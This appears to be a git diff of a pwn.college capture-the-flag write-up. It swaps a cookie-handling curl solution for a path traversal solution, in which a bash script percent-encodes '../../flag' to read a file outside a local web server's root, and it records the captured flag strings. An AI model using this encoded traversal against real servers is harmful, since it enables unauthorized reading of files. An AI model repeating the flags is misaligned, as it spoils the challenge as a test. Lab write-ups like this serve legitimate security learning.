@@ -8,33 +8,17 @@ The webserver program is /challenge/server. You can run it just like any other c
 
 ## Steps
 
-Make an initial connection to the local host using using redirects and saving cookies to get the flag.
-
-### Notes
-
-After you save cookies to a file with `-c cookies.txt`, `curl` will automatically load the cookies from that file for subsequent requests without needing the `-b` option. This is because `curl` automatically checks for a cookie jar (cookie file) when it’s made a request and will use that jar on any subsequent requests.
+After running the server script we see that the server is being served from `http://challenge.localhost:80`. When we attempt to make a curl to the the web root we are greated with the index.html page. We attempt to perform simple directory transversal using `curl http://challenge.localhost:80/../../flag` but fail to get a flag. We then encode our attempt using bash commands and are able to get a flag
 
 ### solution.sh
 
 ```bash
-curl -Lvk -c cookies.txt
-```
-
-### solution_1.sh
-
-```bash
-curl_request(){
-  local HOST=$1
-  local PORT=$2
-  local COOKIE_FILE="cookies.txt"
-
-  # Use -b if the cookie file exists, else use -c to create the cookie file
-  curl -Lkv $( [ -s $COOKIE_FILE ] && echo "-b $COOKIE_FILE" || echo "-c $COOKIE_FILE" ) "http://$HOST:$PORT"
-}
-
-main
+# Performing URL Encoding
+path_to_encode="../../flag"
+url_encoded_path=$(echo -n "$path_to_encode" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
+curl -v "http://challenge.localhost:80/$url_encoded_path"
 ```
 
 ## Solution
 
-pwn.college{swHqM08m1rf5jo0Z_rYj2UoYQOB.dRDMzMDL3MTM3QzW}
+pwn.college{8-d3FDPg4L7vK32R7ritAEEgdb9.ddDOzMDL3MTM3QzW}
